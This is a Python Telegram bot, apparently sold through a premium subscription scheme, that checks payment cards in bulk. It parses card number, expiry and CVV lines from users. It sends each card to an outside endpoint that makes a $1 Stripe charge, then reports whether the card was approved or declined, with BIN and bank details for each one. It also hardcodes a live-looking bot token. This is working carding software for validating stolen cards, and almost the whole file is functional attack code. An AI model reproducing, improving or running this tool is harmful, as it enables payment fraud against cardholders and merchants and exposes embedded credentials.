
import requests
import re
import asyncio
import time
import json
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# Bot Configuration
BOT_TOKEN = "7904751329:AAE4D6WRhfubEFgoi31D9LFEAqRqAlL7_hA"
ADMIN_ID = 7577853954
GROUP_LINK = "https://t.me/+d6J5XBnztrxkNzE1"

# Storage files
PREMIUM_USERS_FILE = "premium_users.json"
PREMIUM_GROUPS_FILE = "premium_groups.json"
REDEEM_CODES_FILE = "redeem_codes.json"

# Initialize storage
def load_json(filename, default=None):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except:
        return default if default is not None else {}

def save_json(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2)

# Load premium data
premium_users = load_json(PREMIUM_USERS_FILE, {})
premium_groups = load_json(PREMIUM_GROUPS_FILE, {})
redeem_codes = load_json(REDEEM_CODES_FILE, {})

def is_premium_active(user_id=None, chat_id=None):
    """Check if user or group has active premium"""
    current_time = datetime.now().isoformat()
    
    # Admin always has access
    if user_id == ADMIN_ID:
        return True
    
    # Check group premium
    if chat_id and str(chat_id) in premium_groups:
        expiry = premium_groups[str(chat_id)]
        if expiry == "lifetime" or expiry > current_time:
            return True
    
    # Check user premium
    if user_id and str(user_id) in premium_users:
        expiry = premium_users[str(user_id)]
        if expiry == "lifetime" or expiry > current_time:
            return True
    
    return False

def add_premium_user(user_id, days):
    """Add premium to a user"""
    if days == 0:
        premium_users[str(user_id)] = "lifetime"
    else:
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        premium_users[str(user_id)] = expiry
    save_json(PREMIUM_USERS_FILE, premium_users)

def add_premium_group(chat_id, days):
    """Add premium to a group"""
    if days == 0:
        premium_groups[str(chat_id)] = "lifetime"
    else:
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        premium_groups[str(chat_id)] = expiry
    save_json(PREMIUM_GROUPS_FILE, premium_groups)

def create_redeem_code(code, days):
    """Create a redeem code"""
    redeem_codes[code] = {
        "days": days,
        "created": datetime.now().isoformat(),
        "used": False
    }
    save_json(REDEEM_CODES_FILE, redeem_codes)

def redeem_code(code, user_id):
    """Redeem a code for a user"""
    if code not in redeem_codes:
        return False, "Invalid redeem code"
    
    if redeem_codes[code]["used"]:
        return False, "This code has already been used"
    
    days = redeem_codes[code]["days"]
    add_premium_user(user_id, days)
    redeem_codes[code]["used"] = True
    redeem_codes[code]["used_by"] = user_id
    redeem_codes[code]["used_at"] = datetime.now().isoformat()
    save_json(REDEEM_CODES_FILE, redeem_codes)
    
    return True, f"✅ Premium activated for {days} days!" if days > 0 else "✅ Lifetime premium activated!"

def get_bin_details(bin_number):
    """Fetch BIN details from antipublic.cc API"""
    try:
        response = requests.get(
            f"https://bins.antipublic.cc/bins/{bin_number}",
            timeout=10
        )
        if response.status_code == 200:
            return response.json()
        return None
    except:
        return None

def detect_card_info(cc_input):
    """Auto-detect and parse card information from various formats"""
    cc_input = cc_input.strip()

    # Try to match pattern: cc|mm|yyyy|cvv or cc|mm|yy|cvv
    pipe_pattern = r'(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pipe_pattern, cc_input)

    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = '20' + yy
        return cc, mm, yy, cvv

    # Try space-separated format
    space_pattern = r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})'
    match = re.search(space_pattern, cc_input)

    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = '20' + yy
        return cc, mm, yy, cvv

    return None

def check_card(cc_input, amount=1):
    """Check card using Xeno Stripe Charge API"""
    start_time = time.time()
    try:
        card_info = detect_card_info(cc_input)
        if not card_info:
            return {"status": "error", "message": "Invalid card format detected.", "time": 0}
        
        cc, mm, yy, cvv = card_info
        
        # Use original year format from input
        api_url = f"https://xeno-stripe-charge.onrender.com/donate?cc={cc}|{mm}|{yy}|{cvv}&amount={amount}"
        response = requests.get(api_url, timeout=30)
        
        elapsed_time = round(time.time() - start_time, 4)

        if response.status_code == 200:
            try:
                data = response.json()
                
                # Handle API response format
                if "status" in data:
                    status = data["status"]
                    response_msg = data.get("response", "")
                    
                    # Check if approved
                    if "Approved" in status or "✅" in status or "success" in status.lower():
                        return {
                            "status": "success",
                            "message": "Approved ✅",
                            "details": response_msg if response_msg else status,
                            "time": elapsed_time
                        }
                    # Check if declined
                    elif "Declined" in status or "❌" in status or "decline" in status.lower():
                        return {
                            "status": "declined",
                            "message": "Declined ❌",
                            "details": response_msg if response_msg else status,
                            "time": elapsed_time
                        }
                    # Other status
                    else:
                        return {
                            "status": "info",
                            "message": status,
                            "details": response_msg if response_msg else "Check response",
                            "time": elapsed_time
                        }
                
                # Fallback: return raw data
                return {
                    "status": "info",
                    "message": str(data),
                    "details": "Raw API response",
                    "time": elapsed_time
                }

            except ValueError:
                # Not JSON, return text
                return {
                    "status": "info",
                    "message": response.text[:200],
                    "details": "Text response from API",
                    "time": elapsed_time
                }
        else:
            # Parse error response for better display
            try:
                error_data = response.json()
                if "response" in error_data:
                    # Try to parse nested JSON in response field
                    try:
                        import json
                        nested = json.loads(error_data["response"])
                        if "error" in nested and "message" in nested["error"]:
                            error_msg = nested["error"]["message"]
                        else:
                            error_msg = error_data.get("message", "Payment failed")
                    except:
                        error_msg = error_data.get("message", "Payment failed")
                else:
                    error_msg = error_data.get("message", f"HTTP {response.status_code}")
                
                return {
                    "status": "declined",
                    "message": "Declined ❌",
                    "details": error_msg,
                    "time": elapsed_time
                }
            except:
                # If can't parse JSON, return raw text
                return {
                    "status": "error",
                    "message": f"HTTP {response.status_code}",
                    "details": response.text[:150] if response.text else "No response",
                    "time": elapsed_time
                }

    except Exception as e:
        elapsed_time = round(time.time() - start_time, 4)
        return {"status": "error", "message": f"Error: {str(e)}", "time": elapsed_time}

# Initialize bot and dispatcher
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    """Handle /start command"""
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 Join Premium Group", url=GROUP_LINK)]
    ])
    
    welcome_text = """
╔════════════════════╗
║  ᴘʀᴏᴏғs - ᴄᴀʀᴅ ᴄʜᴇᴄᴋᴇʀ  ║
╚════════════════════╝

🎯 **Fast & Reliable Card Checking**

━━━━━━━━━━━━━━━━━━━━
📌 **SUPPORTED FORMATS:**

• `cc|mm|yyyy|cvv`
• Single or Mass Check (Multiple Lines)

━━━━━━━━━━━━━━━━━━━━
💎 **PREMIUM ACCESS:**

✅ Private Chat → Premium Required
✅ Premium Groups → Free for All
✅ `/redeem <code>` to Activate

━━━━━━━━━━━━━━━━━━━━
⚙️ **COMMANDS:**

/premium - Check Status
/redeem - Activate Code
/help - Show This Message

━━━━━━━━━━━━━━━━━━━━
🔰 **Powered by Stripe Gateway**
👑 **Bot by @Whosekirito**
"""
    await message.answer(welcome_text, parse_mode='Markdown', reply_markup=keyboard)

@dp.message(Command("premium"))
async def cmd_premium(message: types.Message):
    """Check premium status"""
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    is_private = message.chat.type == "private"
    
    status_text = "**Premium Status:**\n\n"
    
    if user_id == ADMIN_ID:
        status_text += "👑 You are the bot admin - Full access\n\n"
    
    # Check user premium
    if str(user_id) in premium_users:
        expiry = premium_users[str(user_id)]
        if expiry == "lifetime":
            status_text += f"✅ Personal Premium: Lifetime\n\n"
        else:
            status_text += f"✅ Personal Premium: Expires {expiry[:10]}\n\n"
    else:
        status_text += "❌ No personal premium\n\n"
    
    # Check group premium
    if not is_private and str(chat_id) in premium_groups:
        expiry = premium_groups[str(chat_id)]
        if expiry == "lifetime":
            status_text += f"✅ Group Premium: Lifetime\n\n"
        else:
            status_text += f"✅ Group Premium: Expires {expiry[:10]}\n\n"
    
    status_text += "Use /redeem <code> to activate premium"
    
    await message.answer(status_text, parse_mode='Markdown')

@dp.message(Command("redeem"))
async def cmd_redeem(message: types.Message):
    """Redeem a premium code"""
    args = message.text.split(maxsplit=1)
    
    if len(args) < 2:
        await message.answer("❌ Usage: /redeem <code>\n\nExample: /redeem PREMIUM123")
        return
    
    code = args[1].strip()
    user_id = message.from_user.id
    
    success, msg = redeem_code(code, user_id)
    await message.answer(msg)

@dp.message(Command("adduser"))
async def cmd_adduser(message: types.Message):
    """Admin command to add premium to user"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Admin only command")
        return
    
    args = message.text.split()
    if len(args) < 3:
        await message.answer("❌ Usage: /adduser <user_id> <days>\n\nUse 0 for lifetime")
        return
    
    try:
        user_id = int(args[1])
        days = int(args[2])
        add_premium_user(user_id, days)
        
        if days == 0:
            await message.answer(f"✅ Lifetime premium added for user {user_id}")
        else:
            await message.answer(f"✅ {days} days premium added for user {user_id}")
    except ValueError:
        await message.answer("❌ Invalid user ID or days value")

@dp.message(Command("addgroup"))
async def cmd_addgroup(message: types.Message):
    """Admin command to add premium to group"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Admin only command")
        return
    
    args = message.text.split()
    if len(args) < 3:
        await message.answer("❌ Usage: /addgroup <chat_id> <days>\n\nUse 0 for lifetime\n\nTip: Forward a message from the group to get its chat_id")
        return
    
    try:
        chat_id = int(args[1])
        days = int(args[2])
        add_premium_group(chat_id, days)
        
        if days == 0:
            await message.answer(f"✅ Lifetime premium added for group {chat_id}")
        else:
            await message.answer(f"✅ {days} days premium added for group {chat_id}")
    except ValueError:
        await message.answer("❌ Invalid chat ID or days value")

@dp.message(Command("gencode"))
async def cmd_gencode(message: types.Message):
    """Admin command to generate redeem code"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Admin only command")
        return
    
    args = message.text.split()
    if len(args) < 3:
        await message.answer("❌ Usage: /gencode <code> <days>\n\nExample: /gencode PREMIUM30 30\nUse 0 for lifetime")
        return
    
    try:
        code = args[1].upper()
        days = int(args[2])
        create_redeem_code(code, days)
        
        if days == 0:
            await message.answer(f"✅ Lifetime redeem code created:\n\n`{code}`\n\nUsers can redeem with: /redeem {code}", parse_mode='Markdown')
        else:
            await message.answer(f"✅ {days}-day redeem code created:\n\n`{code}`\n\nUsers can redeem with: /redeem {code}", parse_mode='Markdown')
    except ValueError:
        await message.answer("❌ Invalid days value")

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    """Handle /help command"""
    await cmd_start(message)

@dp.message(F.text)
async def handle_text(message: types.Message):
    """Auto-detect and process card data from any message"""
    text = message.text
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_private = message.chat.type == "private"
    username = message.from_user.first_name or "User"

    # Try to detect multiple cards (mass checking)
    lines = text.strip().split('\n')
    cards = []
    for line in lines:
        card_info = detect_card_info(line.strip())
        if card_info:
            cards.append((line.strip(), card_info))
    
    if cards:
        # Check premium access
        if is_private:
            # Private chat - user needs premium
            if not is_premium_active(user_id=user_id):
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="💎 Join Premium Group", url=GROUP_LINK)]
                ])
                await message.answer(
                    "❌ **Premium Required**\n\n"
                    "This bot requires premium subscription for private use.\n\n"
                    "**Get Premium:**\n"
                    "• Use /redeem with a premium code\n"
                    "• Join our premium group for free access\n"
                    "• Contact admin for subscription",
                    parse_mode='Markdown',
                    reply_markup=keyboard
                )
                return
        else:
            # Group chat - check group premium OR user premium
            if not is_premium_active(user_id=user_id, chat_id=chat_id):
                keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="💎 Join Premium Group", url=GROUP_LINK)]
                ])
                await message.answer(
                    "❌ **Premium Required**\n\n"
                    "This group doesn't have premium access.\n\n"
                    "**Options:**\n"
                    "• Get personal premium with /redeem\n"
                    "• Ask admin to upgrade this group\n"
                    "• Join our premium group",
                    parse_mode='Markdown',
                    reply_markup=keyboard
                )
                return
        
        # Determine if user has premium (for display)
        user_status = "FREE" if not is_premium_active(user_id=user_id) else "PREMIUM"
        
        # Premium access confirmed - process cards
        total_cards = len(cards)
        
        # Send processing message
        processing_msg = await message.answer(
            f"🔍 **Mass Checking Started**\n\n"
            f"📊 Total Cards: {total_cards}\n"
            f"⏳ Processing...",
            parse_mode='Markdown'
        )

        # Process each card
        for idx, (original_line, card_info) in enumerate(cards, 1):
            cc, mm, yy, cvv = card_info
            bin_number = cc[:6]
            
            # Update processing status
            if idx % 5 == 0 or idx == total_cards:
                try:
                    await processing_msg.edit_text(
                        f"🔍 **Mass Checking**\n\n"
                        f"📊 Progress: {idx}/{total_cards}\n"
                        f"⏳ Processing...",
                        parse_mode='Markdown'
                    )
                except:
                    pass

            # Check card and get BIN details
            result = check_card(original_line, amount=1)
            bin_details = get_bin_details(bin_number)

        # Format card display
            card_display = f"{cc}|{mm}|{yy}|{cvv}"
            
            # Build BIN details section
            if bin_details:
                brand = bin_details.get("brand", "UNKNOWN").upper()
                card_type = bin_details.get("type", "UNKNOWN").upper()
                level = bin_details.get("level", "UNKNOWN").upper()
                bank = bin_details.get("bank", "UNKNOWN").upper()
                country_name = bin_details.get("country_name", "UNKNOWN").upper()
                country_code = bin_details.get("country_code", "XX")
                country_flag = bin_details.get("country_flag", "🏳️")
                currency = bin_details.get("country_currencies", "UNKNOWN")
                
                bin_section = (
                    f"┏━BIN DETAILS\n"
                    f"┣Bin -» {bin_number} - {brand} - {card_type} - {level}\n"
                    f"┣Bank -» {bank}\n"
                    f"┣Country -» {country_name}[{country_code}] - ['{currency}'] - {country_flag}"
                )
            else:
                bin_section = (
                    f"┏━BIN DETAILS\n"
                    f"┣Bin -» {bin_number} - Information not available"
                )

            # Format response based on result status
            if result["status"] == "success":
                status_text = "APPROVED! ✅"
                response_text = result.get('details', 'Payment Successful')
            elif result["status"] == "declined":
                status_text = "DECLINED ❌"
                response_text = result.get('details', 'Payment Declined')
            elif result["status"] == "error":
                status_text = "ERROR ⚠️"
                response_text = result.get('message', 'Unknown Error')
            else:
                status_text = "INFO ℹ️"
                response_text = result.get('details', result.get('message', 'No details'))

            # Build final response
            response = (
                f"┏━CC CHECKING\n"
                f"┣CARD -» 『 {card_display} 』\n"
                f"┣STATUS -» {status_text}\n"
                f"┣RESPONSE -» {response_text}\n\n"
                f"┏━Transaction\n"
                f"┣GATEWAY -» 1$ Stripe\n\n"
                f"{bin_section}\n\n"
                f"┏━CHECK INFO\n"
                f"┣Time taken -» {result.get('time', 0)}sec\n"
                f"┣Checked by -» {username} [ {user_status} ] 👻\n"
                f"┣Bot by -» @Whosekirito"
            )

            # Send result for each card
            await message.answer(response)
            
            # Small delay between checks to avoid rate limiting
            if idx < total_cards:
                await asyncio.sleep(0.5)
        
        # Delete processing message
        try:
            await processing_msg.delete()
        except:
            pass

async def main():
    """Start the bot"""
    print("🤖 Starting Premium Telegram Bot with aiogram...")
    print(f"📱 Bot Token: {BOT_TOKEN[:20]}...")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("✅ Bot is running! Press Ctrl+C to stop.")
    print("🔄 Auto-detection enabled with premium system")
    print(f"💎 Premium users: {len(premium_users)}")
    print(f"💎 Premium groups: {len(premium_groups)}")
    print(f"🎟️ Redeem codes: {len(redeem_codes)}")

    try:
        # Start polling with proper error handling
        await dp.start_polling(bot, allowed_updates=["message"], skip_updates=True)
    except Exception as e:
        print(f"❌ Error occurred: {e}")
        print("🔄 Restarting bot...")
        await asyncio.sleep(5)
        await main()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
